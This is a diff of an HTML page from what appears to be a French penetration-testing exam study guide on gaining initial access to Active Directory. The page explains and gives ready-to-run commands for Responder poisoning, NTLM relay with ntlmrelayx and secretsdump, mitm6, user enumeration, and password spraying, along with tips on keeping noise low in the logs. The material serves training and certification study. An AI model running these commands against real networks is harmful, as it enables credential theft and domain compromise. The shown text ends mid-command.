@@ -768,12 +768,12 @@
   <a href="#21-poisoning-llmnr-nbt-ns-avec-responder" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2.1 — Poisoning LLMNR / NBT-NS avec Responder
+        2.1 : Poisoning LLMNR / NBT-NS avec Responder
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="2.1 — Poisoning LLMNR / NBT-NS avec Responder">
+    <nav class="md-nav" aria-label="2.1 : Poisoning LLMNR / NBT-NS avec Responder">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -840,12 +840,12 @@
   <a href="#22-ntlm-relay-attack" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2.2 — NTLM Relay Attack
+        2.2 : NTLM Relay Attack
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="2.2 — NTLM Relay Attack">
+    <nav class="md-nav" aria-label="2.2 : NTLM Relay Attack">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -874,7 +874,7 @@
   <a href="#lancement-2-terminaux" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Lancement — 2 terminaux
+        Lancement : 2 terminaux
       
     </span>
   </a>
@@ -885,7 +885,7 @@
   <a href="#mode-socks-utiliser-via-proxychains" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Mode SOCKS — Utiliser via proxychains
+        Mode SOCKS : Utiliser via proxychains
       
     </span>
   </a>
@@ -901,12 +901,12 @@
   <a href="#23-ipv6-mitmv6" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2.3 — IPv6 + MITMv6
+        2.3 : IPv6 + MITMv6
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="2.3 — IPv6 + MITMv6">
+    <nav class="md-nav" aria-label="2.3 : IPv6 + MITMv6">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -926,15 +926,26 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#24-password-spraying" class="md-nav__link">
+  <a href="#24-enumeration-dutilisateurs-sans-credentials" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2.4 — Password Spraying
+        2.4 : Énumération d'utilisateurs sans credentials
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="2.4 — Password Spraying">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#25-password-spraying" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.5 : Password Spraying
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.5 : Password Spraying">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -976,21 +987,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#25-enumeration-dutilisateurs-sans-credentials" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2.5 — Énumération d'utilisateurs sans credentials
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#26-as-rep-roasting-sans-credentials" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2.6 — AS-REP Roasting sans credentials
+        2.6 : AS-REP Roasting sans credentials
       
     </span>
   </a>
@@ -1001,7 +1001,7 @@
   <a href="#27-valider-et-diffuser-les-credentials-obtenus" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2.7 — Valider et diffuser les credentials obtenus
+        2.7 : Valider et diffuser les credentials obtenus
       
     </span>
   </a>
@@ -1630,7 +1630,7 @@
   
 
 
-<h1 id="phase-2-acces-initial">Phase 2 — Accès Initial<a class="headerlink" href="#phase-2-acces-initial" title="Permanent link">&para;</a></h1>
+<h1 id="phase-2-acces-initial">Phase 2 : Accès Initial<a class="headerlink" href="#phase-2-acces-initial" title="Permanent link">&para;</a></h1>
 <h2 id="le-probleme">Le problème<a class="headerlink" href="#le-probleme" title="Permanent link">&para;</a></h2>
 <p>Pour énumérer l'AD en profondeur, il te faut <strong>un compte valide du domaine</strong>. Même un compte lambda sans privilèges. Pourquoi ? Parce que l'AD, par défaut, donne beaucoup d'informations à n'importe quel utilisateur authentifié.</p>
 <p>Il y a plusieurs techniques pour obtenir ce premier accès.</p>
@@ -1649,16 +1649,16 @@
 </span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>IPv6 actif sur le réseau (pas de DHCPv6) ?
 </span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    → OUI → MITMv6 + relay vers LDAP (2.3)
 </span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>J&#39;ai une liste d&#39;utilisateurs ?
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    → OUI → Password Spraying (2.4)
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>    → NON → Énumération users sans credentials (2.5) puis spraying
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>Pas encore de credentials ni de liste users ?
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    → Énumération users sans credentials (2.4)
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>    → Puis Password Spraying (2.5)
 </span></code></pre></div>
 <div class="admonition tip">
 <p class="admonition-title">Recommandation exam</p>
 <p>Lancer <strong>toutes ces attaques en parallèle</strong> dans des terminaux séparés. Ne pas attendre qu'une réussisse avant de lancer la suivante.</p>
 </div>
 <hr />
-<h2 id="21-poisoning-llmnr-nbt-ns-avec-responder">2.1 — Poisoning LLMNR / NBT-NS avec Responder<a class="headerlink" href="#21-poisoning-llmnr-nbt-ns-avec-responder" title="Permanent link">&para;</a></h2>
+<h2 id="21-poisoning-llmnr-nbt-ns-avec-responder">2.1 : Poisoning LLMNR / NBT-NS avec Responder<a class="headerlink" href="#21-poisoning-llmnr-nbt-ns-avec-responder" title="Permanent link">&para;</a></h2>
 <h3 id="le-probleme-de-resolution-de-noms">Le problème de résolution de noms<a class="headerlink" href="#le-probleme-de-resolution-de-noms" title="Permanent link">&para;</a></h3>
 <p>Quand une machine Windows cherche <code>\\SERVEUR-COMPTA</code> sur le réseau, elle suit cet ordre :</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>1. Cache local
@@ -1702,19 +1702,19 @@
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>user   domain      challenge         response NTLMv2
 </span></code></pre></div>
 <h3 id="quest-ce-quon-fait-avec-ce-hash">Qu'est-ce qu'on fait avec ce hash ?<a class="headerlink" href="#quest-ce-quon-fait-avec-ce-hash" title="Permanent link">&para;</a></h3>
-<p><strong>Option 1 — Le cracker offline avec Hashcat</strong></p>
+<p><strong>Option 1 : Le cracker offline avec Hashcat</strong></p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>/usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span>/usr/share/wordlists/rockyou.txt
 </span></code></pre></div>
 <p>Si le mot de passe est faible, tu l'obtiens en clair.</p>
-<p><strong>Option 2 — Le relayer directement (sans le cracker)</strong></p>
+<p><strong>Option 2 : Le relayer directement (sans le cracker)</strong></p>
 <p>→ Voir section 2.2 ci-dessous.</p>
 <div class="admonition warning">
 <p class="admonition-title">À retenir</p>
-<p>Ce hash NTLMv2 <strong>n'est pas utilisable directement en Pass-the-Hash</strong>. Il faut le cracker ou le relayer. Voir <a href="../../fondamentaux/ntlm/">NTLM — distinction critique</a>.</p>
+<p>Ce hash NTLMv2 <strong>n'est pas utilisable directement en Pass-the-Hash</strong>. Il faut le cracker ou le relayer. Voir <a href="../../fondamentaux/ntlm/">NTLM : distinction critique</a>.</p>
 </div>
 <hr />
-<h2 id="22-ntlm-relay-attack">2.2 — NTLM Relay Attack<a class="headerlink" href="#22-ntlm-relay-attack" title="Permanent link">&para;</a></h2>
+<h2 id="22-ntlm-relay-attack">2.2 : NTLM Relay Attack<a class="headerlink" href="#22-ntlm-relay-attack" title="Permanent link">&para;</a></h2>
 <h3 id="le-concept">Le concept<a class="headerlink" href="#le-concept" title="Permanent link">&para;</a></h3>
 <p>Au lieu de cracker le hash, tu le <strong>relaies en temps réel</strong> vers une autre machine.</p>
 <p><strong>L'analogie :</strong> tu interceptes le badge d'Alice et tu l'utilises immédiatement pour ouvrir une autre porte avant qu'Alice s'en rende compte.</p>
@@ -1736,15 +1736,15 @@
 <p>Pour que le relay fonctionne, la <strong>signature SMB doit être désactivée</strong> sur la cible.
 C'est souvent le cas sur les postes de travail, rarement sur les DC.</p>
 </div>
-<h3 id="lancement-2-terminaux">Lancement — 2 terminaux<a class="headerlink" href="#lancement-2-terminaux" title="Permanent link">&para;</a></h3>
-<p><strong>Terminal 1 — Responder (SMB et HTTP désactivés)</strong></p>
+<h3 id="lancement-2-terminaux">Lancement : 2 terminaux<a class="headerlink" href="#lancement-2-terminaux" title="Permanent link">&para;</a></h3>
+<p><strong>Terminal 1 : Responder (SMB et HTTP désactivés)</strong></p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Editer /etc/responder/Responder.conf : SMB = Off, HTTP = Off</span>
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/responder/Responder.conf
 </span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c1"># Lancer Responder — empoisonne mais ne sert pas les réponses</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c1"># Lancer Responder : empoisonne mais ne sert pas les réponses</span>
 </span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span><span class="nv">$IFACE</span><span class="w"> </span>-rdw
 </span></code></pre></div>
-<p><strong>Terminal 2 — ntlmrelayx</strong></p>
+<p><strong>Terminal 2 : ntlmrelayx</strong></p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Relay basique → dump SAM si admin</span>
 </span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>~/certif/targets_relay.txt<span class="w"> </span>-smb2support
 </span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
@@ -1754,7 +1754,7 @@ C'est souvent le cas sur les postes de travail, rarement sur les DC.</p>
 </span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="c1"># Relay vers LDAP (créer un compte ou modifier les ACL)</span>
 </span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--no-da<span class="w"> </span>--no-acl
 </span></code></pre></div>
-<h3 id="mode-socks-utiliser-via-proxychains">Mode SOCKS — Utiliser via proxychains<a class="headerlink" href="#mode-socks-utiliser-via-proxychains" title="Permanent link">&para;</a></h3>
+<h3 id="mode-socks-utiliser-via-proxychains">Mode SOCKS : Utiliser via proxychains<a class="headerlink" href="#mode-socks-utiliser-via-proxychains" title="Permanent link">&para;</a></h3>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Dans ntlmrelayx, taper &quot;socks&quot; pour voir les sessions actives</span>
 </span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>&gt;<span class="w"> </span>socks
 </span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
@@ -1767,7 +1767,7 @@ C'est souvent le cas sur les postes de travail, rarement sur les DC.</p>
 </span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>proxychains<span class="w"> </span>-q<span class="w"> </span>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-no-pass
 </span></code></pre></div>
 <hr />
-<h2 id="23-ipv6-mitmv6">2.3 — IPv6 + MITMv6<a class="headerlink" href="#23-ipv6-mitmv6" title="Permanent link">&para;</a></h2>
+<h2 id="23-ipv6-mitmv6">2.3 : IPv6 + MITMv6<a class="headerlink" href="#23-ipv6-mitmv6" title="Permanent link">&para;</a></h2>
 <h3 id="le-probleme-ipv6-dans-les-ad">Le problème IPv6 dans les AD<a class="headerlink" href="#le-probleme-ipv6-dans-les-ad" title="Permanent link">&para;</a></h3>
 <p>Windows a IPv6 <strong>activé par défaut</strong>, mais la plupart des entreprises n'ont pas d'infrastructure IPv6. Résultat : aucun serveur DHCPv6 ne répond sur le réseau.</p>
 <p><strong>mitm6</strong> exploite ça :</p>
@@ -1790,59 +1790,60 @@ C'est souvent le cas sur les postes de travail, rarement sur les DC.</p>
 </span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">    </span>-tf<span class="w"> </span>~/certif/targets_relay.txt
 </span></code></pre></div>
 <hr />
-<h2 id="24-password-spraying">2.4 — Password Spraying<a class="headerlink" href="#24-password-spraying" title="Permanent link">&para;</a></h2>
+<h2 id="24-enumeration-dutilisateurs-sans-credentials">2.4 : Énumération d'utilisateurs sans credentials<a class="headerlink" href="#24-enumeration-dutilisateurs-sans-credentials" title="Permanent link">&para;</a></h2>
+<p>Avant de pouvoir sprayer, il faut une liste de comptes valides. Trois méthodes à tester dans l'ordre :</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Méthode 1 : RID brute force via null session (la plus fiable)</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--rid-brute<span class="w"> </span><span class="m">5000</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>SidTypeUser<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="s1">&#39;\&#39;</span><span class="w"> </span><span class="s1">&#39;{print $NF}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39; &#39;</span><span class="w"> </span>-f1<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span>&gt;<span class="w"> </span>~/certif/users.txt
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c1"># Méthode 2 : Kerbrute (validation via AS-REQ Kerberos, très discret)</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>kerbrute<span class="w"> </span>userenum<span class="w"> </span>--dc<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN_FQDN</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">    </span>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">    </span>-o<span class="w"> </span>~/certif/valid_users.txt
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="c1"># Méthode 3 : LDAP anonyme (si le DC l&#39;autorise)</span>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="w">    </span>-b<span class="w"> </span><span class="s2">&quot;DC=</span><span class="si">${</span><span class="nv">DOMAIN_FQDN</span><span class="p">/./,DC=</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="w">    </span><span class="s2">&quot;(objectClass=user)&quot;</span><span class="w"> </span>sAMAccountName<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="w">    </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>sAMAccountName<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="w">    </span>&gt;<span class="w"> </span>~/certif/users.txt
+</span></code></pre></div>
+<p>Une fois <code>~/certif/users.txt</code> généré, tu peux passer au spraying (2.5) et à l'AS-REP Roasting (2.6).</p>
+<hr />
+<h2 id="25-password-spraying">2.5 : Password Spraying<a class="headerlink" href="#25-password-spraying" title="Permanent link">&para;</a></h2>
 <h3 id="le-concept_1">Le concept<a class="headerlink" href="#le-concept_1" title="Permanent link">&para;</a></h3>
 <p>Au lieu de bruteforcer un compte (qui se verrouille), tu testes <strong>un seul mot de passe</strong> sur <strong>tous les comptes</strong>.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>alice    → Password2024  ✗
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>bob      → Password2024  ✓  ← accès obtenu !
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>charlie  → Password2024  ✗
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>...
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>alice    → Password2024  ✗
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>bob      → Password2024  ✓  ← accès obtenu !
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>charlie  → Password2024  ✗
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>...
 </span></code></pre></div>
 <p>Pourquoi ça marche ? Parce que dans toute grande entreprise, quelqu'un a un mot de passe faible ou saisonnier.</p>
 <h3 id="verifier-la-politique-de-verrouillage">Vérifier la politique de verrouillage<a class="headerlink" href="#verifier-la-politique-de-verrouillage" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># TOUJOURS vérifier AVANT de sprayer !</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--pass-pol
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># TOUJOURS vérifier AVANT de sprayer !</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--pass-pol
 </span></code></pre></div>
 <h3 id="spraying">Spraying<a class="headerlink" href="#spraying" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># Test avec un mot de passe</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>~/certif/users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Password2024&#39;</span><span class="w"> </span>--continue-on-success
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="c1"># Mots de passe saisonniers à tester (1 vague à la fois)</span>
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>~/certif/users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome1!&#39;</span><span class="w"> </span>--continue-on-success
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>~/certif/users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Bienvenue1!&#39;</span><span class="w"> </span>--continue-on-success
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>~/certif/users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Azerty123!&#39;</span><span class="w"> </span>--continue-on-success
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>
-</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="c1"># Kerbrute spray (génère moins de bruit dans les logs)</span>
-</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>kerbrute<span class="w"> </span>passwordspray<span class="w"> </span>--dc<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN_FQDN</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="w">    </span>~/certif/users.txt<span class="w"> </span><span class="s1">&#39;Password2024&#39;</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Test avec un mot de passe</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>~/certif/users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Password2024&#39;</span><span class="w"> </span>--continue-on-success
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1"># Mots de passe saisonniers à tester (1 vague à la fois)</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>~/certif/users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome1!&#39;</span><span class="w"> </span>--continue-on-success
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>~/certif/users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Bienvenue1!&#39;</span><span class="w"> </span>--continue-on-success
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span>~/certif/users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Azerty123!&#39;</span><span class="w"> </span>--continue-on-success
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="c1"># Kerbrute spray (génère moins de bruit dans les logs)</span>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>kerbrute<span class="w"> </span>passwordspray<span class="w"> </span>--dc<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN_FQDN</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="w">    </span>~/certif/users.txt<span class="w"> </span><span class="s1">&#39;Password2024&#39;</span>
 </span></code></pre></div>
 <div class="admonition danger">
 <p class="admonition-title">Attention au verrouillage</p>
 <p>Respecter la politique de verrouillage des comptes. En général, on attend <strong>30 minutes entre chaque vague</strong>. Un compte verrouillé fait du bruit et alerte les admins.</p>
 </div>
 <hr />
-<h2 id="25-enumeration-dutilisateurs-sans-credentials">2.5 — Énumération d'utilisateurs sans credentials<a class="headerlink" href="#25-enumeration-dutilisateurs-sans-credentials" title="Permanent link">&para;</a></h2>
-<p>Si tu n'as pas encore de liste d'utilisateurs :</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># RID brute force (null session)</span>
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--rid-brute<span class="w"> </span><span class="m">5000</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="se">\</span>
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="w">    </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>SidTypeUser<span class="w"> </span><span class="se">\</span>
